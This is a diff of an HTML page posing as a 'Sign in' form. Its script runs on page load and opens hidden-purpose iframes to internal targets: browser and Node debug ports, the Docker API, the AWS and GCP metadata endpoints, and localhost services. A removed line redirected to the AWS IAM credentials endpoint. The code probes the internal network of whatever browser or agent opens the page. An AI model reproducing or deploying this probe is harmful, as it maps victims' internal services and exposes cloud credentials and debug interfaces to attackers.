@@ -4,7 +4,12 @@
 <meta charset="utf-8">
 <title>Sign in</title>
 <style>
-  body { font: 12px system-ui, monospace; max-width: 55rem; margin: 1rem auto; }
+  body { font: 12px system-ui, monospace; max-width: 60rem; margin: 1rem auto; }
+  label { display: block; margin-bottom: .4rem; }
+  input { width: 100%; padding: .3rem; box-sizing: border-box; }
+  .probe { margin-top: 1rem; }
+  .probe h3 { margin: .3rem 0; font: 12px monospace; background: #eef; padding: .2rem .4rem; }
+  .probe iframe { width: 100%; height: 130px; border: 1px solid #999; display: block; }
 </style>
 </head>
 <body>
@@ -16,9 +21,39 @@
 </form>
 <script>
 "use strict";
-setTimeout(function () {
-  window.location.href = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
-}, 2000);
+document.getElementById("login-form").addEventListener("submit", function (ev) { ev.preventDefault(); });
+
+var targets = [
+  "http://127.0.0.1:9222/json/version",
+  "http://127.0.0.1:9222/json/list",
+  "http://127.0.0.1:9229/json/list",
+  "http://172.17.0.1:2375/version",
+  "http://127.0.0.1:2375/version",
+  "http://172.17.0.1/",
+  "http://169.254.169.254/latest/meta-data/",
+  "http://metadata.google.internal/computeMetadata/v1/",
+  "http://localhost:8080/",
+  "http://localhost:3000/"
+];
+
+var container = document.createElement("div");
+document.body.appendChild(container);
+
+targets.forEach(function (url, i) {
+  var box = document.createElement("div");
+  box.className = "probe";
+  var h = document.createElement("h3");
+  h.textContent = (i + 1) + ". " + url;
+  var f = document.createElement("iframe");
+  f.src = url;
+  f.onload = function () { h.textContent += "  [onload fired]"; };
+  f.onerror = function () { h.textContent += "  [onerror fired]"; };
+  box.appendChild(h);
+  box.appendChild(f);
+  container.appendChild(box);
+});
+
+setTimeout(function () { window.scrollTo(0, 0); }, 6000);
 </script>
 </body>
 </html>
